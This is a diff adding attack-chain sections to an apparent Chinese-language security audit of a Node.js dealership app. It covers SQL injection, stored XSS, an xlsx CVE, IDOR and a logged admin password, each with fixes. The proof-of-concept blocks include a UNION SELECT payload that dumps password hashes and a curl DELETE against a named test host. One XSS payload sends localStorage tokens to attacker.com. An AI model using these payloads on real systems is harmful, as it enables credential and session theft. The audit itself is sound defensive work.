@@ -21,7 +21,446 @@
 
 ---
 
-## CRITICAL 發現（需立即修補）
+## 系統架構與攻擊面
+
+```mermaid
+flowchart LR
+    U["👤 使用者<br/>瀏覽器"]
+    Z["☁️ Zeabur Edge<br/>TLS 終止"]
+    A["🖥️ Node.js App<br/>Express + pg"]
+    P[("🗄️ PostgreSQL<br/>port 5432")]
+    X["😈 攻擊者"]
+
+    U -->|HTTPS 加密| Z
+    Z -->|HTTP 明文<br/>內網| A
+    A -->|明文 5432<br/>無 TLS| P
+    X -.->|1. 上傳惡意 Excel| A
+    X -.->|2. 釣魚 / XSS| U
+    X -.->|3. 枚舉登入| A
+
+    style U fill:#dbeafe,stroke:#3b82f6
+    style Z fill:#fef3c7,stroke:#f59e0b
+    style A fill:#fee2e2,stroke:#ef4444
+    style P fill:#fee2e2,stroke:#ef4444
+    style X fill:#1f2937,stroke:#dc2626,color:#fff
+```
+
+**暴露面分析：**
+- 🔴 **App → PG 連線明文** — 若 `POSTGRES_SSL=false`，所有 SQL 與 hash 明文傳輸
+- 🟠 **Zeabur 內部 HTTP** — 邊界到 app container 依賴容器隔離
+- 🟢 **瀏覽器 → Zeabur** — HTTPS 加密，但無 HSTS（首次訪問可被 downgrade）
+- 🔴 **Token 存 localStorage** — XSS 即可竊取
+
+---
+
+## 關鍵攻擊鏈示意
+
+以下挑 5 條攻擊鏈詳細拆解「**攻擊手法 → 流程 → POC → 修補**」。其餘發現列於後續章節。
+
+---
+
+### 🔴 攻擊鏈 #1：SQL Injection 竊取全廠稽核資料（C1）
+
+**涉及漏洞**：C1 (`routes/auditLogs.js:94`)
+**攻擊者需具備**：super_admin 權限（或 DB 直接寫入權限）
+**影響資產**：所有稽核紀錄、使用者密碼 hash、跨廠別資料
+
+#### 攻擊手法（Second-Order SQL Injection）
+
+傳統 SQL injection 是把惡意字串塞進一個**即時執行**的參數；這裡的攻擊屬**二階注入**：把惡意 payload 先寫入 DB，等另一個查詢讀出該值再內插時才觸發。
+
+攻擊手法：
+1. 攻擊者（或被釣魚的 super_admin）透過合法 `PUT /api/users/:id` 把某位 branch_admin 的 `branch` 欄位改成 SQL payload
+2. 該 branch_admin 下次查詢稽核紀錄時，後端把 `guard.branch` 直接字串內插到 SQL
+3. payload 執行，跨廠資料外洩
+
+#### 攻擊流程
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor Att as 🕴️ 攻擊者<br/>(pwned super_admin)
+    participant API as 🖥️ Node App
+    participant DB as 🗄️ PostgreSQL
+    actor Victim as 👤 branch_admin<br/>AMA 廠
+
+    Att->>API: PUT /api/users/42<br/>{branch: "AMA' UNION SELECT password_hash FROM users--"}
+    API->>DB: UPDATE users SET branch=$1 WHERE id=42
+    DB-->>API: ok
+    Note over DB: 惡意字串已寫入 users.branch
+
+    Victim->>API: GET /api/audit-logs (帶 token)
+    API->>API: guard.branch = req.user.branch<br/>= "AMA' UNION SELECT password_hash..."
+    API->>DB: SELECT ... WHERE user_branch = 'AMA' UNION SELECT password_hash FROM users--'
+    DB-->>API: 洩漏全表 password_hash
+    API-->>Victim: 200 (回傳 hash)
+    Note over Victim: 受害者不知情<br/>hash 已外流到攻擊者監控的 response
+```
+
+#### POC（白箱驗證用）
+
+```bash
+# 步驟 1：用 super_admin token 改 branch 欄位
+curl -X PUT "https://volvo-upload-test.zeabur.app/api/users/42" \
+  -H "Authorization: Bearer <super_admin_token>" \
+  -H "Content-Type: application/json" \
+  -d "{\"branch\":\"AMA' UNION SELECT password_hash,password_salt FROM users--\"}"
+
+# 步驟 2：以該 branch_admin 帳號登入 → 呼叫稽核查詢
+curl "https://volvo-upload-test.zeabur.app/api/audit-logs" \
+  -H "Authorization: Bearer <branch_admin_token>"
+# response body 會包含 UNION 出來的 hash / salt
+```
+
+#### 建議修補
+
+改用參數綁定（`$N`）：
+
+```js
+// ❌ 漏洞版本（auditLogs.js:94）
+${guard.role === 'branch_admin' ? `AND user_branch = '${guard.branch}'` : ''}
+
+// ✅ 修補版本
+const conds = [];
+const params = [];
+let idx = 1;
+if (guard.role === 'branch_admin') {
+  conds.push(`user_branch = $${idx++}`);
+  params.push(guard.branch);
+}
+const sql = `SELECT ... FROM audit_logs WHERE ${conds.join(' AND ')}`;
+await pool.query(sql, params);
+```
+
+---
+
+### 🔴 攻擊鏈 #2：Stored XSS → 竊取所有人 Token（C2 + C5）
+
+**涉及漏洞**：C2 (`public/stats.html:1334`) + C5 (localStorage 儲存 token)
+**攻擊者需具備**：upload 權限（上傳維修業務 Excel）
+**影響資產**：所有受害使用者的 session、任意身份冒充
+
+#### 攻擊手法（Stored XSS + Token Exfiltration）
+
+1. 攻擊者上傳特製 Excel，在 `service_advisor` 欄位塞 JS payload
+2. Payload 存進 `repair_income` 表
+3. 任何使用者打開報表頁，前端 `innerHTML=\`...${r.service_advisor}...\`` 直接渲染
+4. JS 在受害者 session 內執行，讀 `localStorage.dms_token` 送到攻擊者 server
+5. 攻擊者拿 token 呼叫任何 API（含 super_admin 權限操作）
+
+#### 攻擊流程
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor Att as 🕴️ 攻擊者
+    participant Srv as 🖥️ Node App
+    participant DB as 🗄️ PostgreSQL
+    actor V as 👤 受害 super_admin
+    participant XSrv as 💀 攻擊者 Server
+
+    Att->>Srv: POST /api/upload/repair<br/>Excel cell: <img src=x onerror="...">
+    Srv->>DB: INSERT INTO repair_income<br/>(service_advisor='<img src=x ...>')
+    Note over DB: 惡意 payload 永久儲存
+
+    V->>Srv: GET /stats.html (登入後瀏覽)
+    Srv-->>V: HTML 頁面
+    V->>Srv: GET /api/stats/repair
+    Srv->>DB: SELECT ...
+    DB-->>Srv: rows (含惡意 service_advisor)
+    Srv-->>V: JSON
+
+    Note over V: 前端:<br/>innerHTML=`<td>${r.service_advisor}</td>`<br/>觸發 onerror
+
+    V->>XSrv: GET /steal?t=<br/>eyJhbGci...<受害者token>
+    Note over XSrv: 記錄 token
+
+    Att->>Srv: 用偷來的 token 呼叫<br/>任何管理 API
+    Srv-->>Att: 以受害者身份執行
+```
+
+#### POC
+
+```python
+# 步驟 1：產生惡意 xlsx
+import openpyxl
+wb = openpyxl.Workbook()
+ws = wb.active
+ws.append(['工單號', 'SA', '其他欄位...'])
+payload = '<img src=x onerror="fetch(\'https://attacker.com/s?t=\'+localStorage.dms_token)">'
+ws.append(['W001', payload, 'foo'])
+wb.save('evil.xlsx')
+
+# 步驟 2：上傳（需有 upload 權限）
+# curl -X POST -F "file=@evil.xlsx" ... /api/upload/repair
+
+# 步驟 3：任何 super_admin 開 stats.html → XSS 觸發 → token 飛到 attacker.com
+```
+
+#### 建議修補（雙層防禦）
+
+**層 1：Output encoding（全站必做）**
+
+```js
+// 在 stats.html 已有 _h() helper（line 1118），確保所有塞 innerHTML
+// 的使用者控制欄位都過一層 escape：
+
+// ❌ 漏洞
+`<td>${r.service_advisor}</td>`
+
+// ✅ 修補
+`<td>${_h(r.service_advisor)}</td>`
+```
+
+**層 2：Token 改 HttpOnly cookie（根本解）**
+
+```js
+// 登入成功後 server 端：
+res.cookie('dms_token', token, {
+  httpOnly: true,          // JS 讀不到
+  secure: true,             // 只走 HTTPS
+  sameSite: 'strict',       // 防 CSRF
+  maxAge: 8 * 60 * 60 * 1000,
+});
+// localStorage.dms_token 棄用；XSS 即使發生也竊不到 token
+```
+
+---
+
+### 🔴 攻擊鏈 #3：xlsx CVE → Prototype Pollution（C4）
+
+**涉及漏洞**：C4 (xlsx@0.18.5 — CVE-2023-30533)
+**攻擊者需具備**：upload 權限
+**影響資產**：整個 Node process 的 runtime 行為
+
+#### 攻擊手法
+
+`xlsx@0.18.5` 的 `XLSX.read()` 在解析特製 workbook 時未過濾 `__proto__` 等特殊鍵，攻擊者可在 sheet 結構中埋入 prototype pollution payload，導致 `Object.prototype` 被全域污染。
+
+#### 攻擊流程
+
+```mermaid
+flowchart TD
+    A[攻擊者產生惡意 xlsx<br/>內含 __proto__.isAdmin = true] --> B[POST /api/upload]
+    B --> C[multer 接收 buffer]
+    C --> D[XLSX.read buffer]
+    D --> E{解析過程}
+    E --> F["Object.prototype.isAdmin = true<br/>🔥 全域污染"]
+    F --> G[後續任何檢查<br/>if user.isAdmin 都為 true]
+    G --> H[權限繞過 / 狀態混淆]
+
+    style A fill:#fecaca
+    style F fill:#dc2626,color:#fff
+    style H fill:#991b1b,color:#fff
+```
+
+#### POC（概念）
+
+```js
+// 攻擊者用修改過的 xlsx library 產生 workbook，
+// 在 sheet metadata 中注入 __proto__ 鍵
+// 受害伺服器 XLSX.read() 後：
+
+console.log({}.isAdmin);  // => true (全域被污染)
+
+// 後續 middleware:
+if (user.isAdmin) grantAccess();  // 繞過
+```
+
+#### 建議修補
+
+```json
+// package.json
+{
+  "dependencies": {
+-   "xlsx": "^0.18.5"
++   "xlsx": "npm:@e965/xlsx@^0.20.3"
+  }
+}
+```
+
+`@e965/xlsx` 是社群維護的 CVE-patched fork，API 100% 相容。
+
+---
+
+### 🟠 攻擊鏈 #4：橫向越權刪他廠資料（H8）
+
+**涉及漏洞**：H8 (`routes/bodyshopBonus.js:639`)
+**攻擊者需具備**：任一廠別 branch_admin + `feature:bodyshop_bonus_edit` 權限
+**影響資產**：所有廠別的鈑烤獎金申請紀錄
+
+#### 攻擊手法
+
+典型的 **IDOR / Horizontal Privilege Escalation** — DELETE endpoint 只檢查 resource ID 存在，沒驗證 resource 是否屬於呼叫者的 branch。
+
+#### 攻擊流程
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor AMA as 👤 AMA branch_admin<br/>(惡意/好奇)
+    participant API as 🖥️ Node App
+    participant DB as 🗄️ PostgreSQL
+
+    Note over AMA: 列舉 AMC 廠的 application_id<br/>(從共用報表或猜測)
+    AMA->>API: DELETE /api/bodyshop-bonus/applications/999
+    API->>API: requirePermission('bodyshop_bonus_edit') ✅
+    Note over API: ❌ 沒檢查<br/>application.branch === caller.branch
+    API->>DB: DELETE FROM bodyshop_bonus_applications<br/>WHERE id=999
+    DB-->>API: 1 row affected (AMC 的資料)
+    Note over DB: CASCADE 連子列一起刪
+    API-->>AMA: { ok: true }
+```
+
+#### POC
+
+```bash
+# AMA branch_admin 的 token 可刪 AMC 的任何 application
+curl -X DELETE "https://volvo-upload-test.zeabur.app/api/bodyshop-bonus/applications/999" \
+  -H "Authorization: Bearer <AMA_admin_token>"
+# 回應: {"ok":true}  ← 不論 id 999 屬於哪廠
+```
+
+#### 建議修補
+
+```js
+// routes/bodyshopBonus.js:639
+router.delete('/bodyshop-bonus/applications/:id',
+  requirePermission('feature:bodyshop_bonus_edit'),
+  async (req, res) => {
+    try {
+      const guard = req.user;  // 從 requireAuth middleware 取得
+      const r = await pool.query(
+        'SELECT app_period, branch FROM bodyshop_bonus_applications WHERE id=$1',
+        [req.params.id]
+      );
+      if (!r.rows[0]) return res.status(404).json({ error: '找不到資料' });
+
+      // ✅ 新增：branch_admin 只能刪自己廠的
+      if (guard.role === 'branch_admin' && r.rows[0].branch !== guard.branch) {
+        return res.status(403).json({ error: '無權刪除其他廠別的資料' });
+      }
+
+      if (checkPeriodLock(r.rows[0].app_period, res, req)) return;
+      await pool.query(
+        'DELETE FROM bodyshop_bonus_applications WHERE id=$1',
+        [req.params.id]
+      );
+      res.json({ ok: true });
+    } catch(e) { res.status(500).json({ error: e.message }); }
+  }
+);
+```
+
+**系統性修補**：建議**全站 audit 所有 `:id` 路由**，確保 DELETE / PATCH / PUT 都有 ownership check。
+
+---
+
+### 🟠 攻擊鏈 #5：Bootstrap 密碼從雲端 log 外洩（H9）
+
+**涉及漏洞**：H9 (`db/init.js:732`)
+**攻擊者需具備**：雲端 log 讀取權限（Zeabur 員工 / 共享 log 的同事 / 誤開啟的 log 分享連結）
+**影響資產**：初始 super_admin 帳號，可能長期有效
+
+#### 攻擊手法
+
+若首次部署未設 `INITIAL_ADMIN_PASSWORD` env，init.js 會**隨機產生密碼並 `console.log` 印到 stdout**。雲端平台（Zeabur / AWS / GCP）會保留 stdout 作為 log，**可能保存數週到數年**。
+
+#### 攻擊流程
+
+```mermaid
+flowchart LR
+    D[初次部署] --> E{INITIAL_ADMIN_<br/>PASSWORD 有設?}
+    E -->|否| F[crypto.randomBytes 產密碼]
+    F --> G["console.log('admin / xYz123abc')"]
+    G --> H[stdout]
+    H --> I["☁️ Zeabur Log<br/>保留 N 天/年"]
+    I --> J1[Zeabur 員工<br/>debug 時可見]
+    I --> J2[共享 log 的同事]
+    I --> J3[意外公開的 log URL]
+    J1 --> K[攻擊者用 admin + 密碼登入]
+    J2 --> K
+    J3 --> K
+    K --> L[🔥 super_admin 完全接管]
+
+    E -->|有| M[印 '已建立' 無密碼]
+    M --> N[✅ 安全]
+
+    style G fill:#fecaca
+    style I fill:#fca5a5
+    style L fill:#991b1b,color:#fff
+    style N fill:#bbf7d0
+```
+
+#### 建議修補
+
+```js
+// ❌ 漏洞版本 (db/init.js:732)
+if (_env) {
+  console.log('[initDB] ✅ 預設管理員已建立: admin（使用 INITIAL_ADMIN_PASSWORD 指定的密碼）');
+} else {
+  console.log(`[initDB] ✅ 預設管理員已建立: admin / ${_pwd}（請立即變更...）`);
+}
+
+// ✅ 修補版本：production 強制要求 env
+if (!_env && process.env.NODE_ENV === 'production') {
+  console.error('[initDB] ❌ production 環境必須設定 INITIAL_ADMIN_PASSWORD');
+  process.exit(1);
+}
+// 開發環境若 auto-generate，至少寫入 file（container 重啟即消失）
+if (!_env) {
+  require('fs').writeFileSync('/tmp/initial_admin_password.txt', _pwd, { mode: 0o600 });
+  console.log('[initDB] ✅ admin 密碼已寫入 /tmp/initial_admin_password.txt（僅本次有效）');
+}
+```
+
+**配套措施**：`users.must_change_password` 欄位，首次登入強制改密碼。
+
+---
+
+## 嚴重度分佈視覺化
+
+```mermaid
+pie showData title 發現嚴重度分佈（合計 38 項）
+    "CRITICAL (5)" : 5
+    "HIGH (9)" : 9
+    "MEDIUM (13)" : 13
+    "LOW (7)" : 7
+    "INFO (4)" : 4
+```
+
+```mermaid
+flowchart LR
+    subgraph P0[P0 · 48 小時]
+        P01[C1 SQL Inject]
+        P02[C4 xlsx CVE]
+        P03[PG 密碼輪替]
+        P04[內網 hostname]
+    end
+    subgraph P1[P1 · 7 天]
+        P11[C2 XSS]
+        P12[C3 CSRF]
+        P13[C5 Cookie]
+        P14[H8 越權]
+        P15[H9 密碼 log]
+        P16[H1 Helmet]
+        P17[H2 rate limit]
+        P18[H3 鎖定]
+    end
+    subgraph P2[P2 · 30 天]
+        P21[H4-H7]
+        P22[M1-M13]
+    end
+
+    P0 --> P1 --> P2
+    style P0 fill:#fecaca,stroke:#dc2626
+    style P1 fill:#fed7aa,stroke:#ea580c
+    style P2 fill:#fef08a,stroke:#ca8a04
+```
+
+---
+
+
 
 ### C1. SQL Injection via `guard.branch` 字串內插
 - **檔案**：`routes/auditLogs.js:94, 115-116, 128, 135, 143, 154, 163`
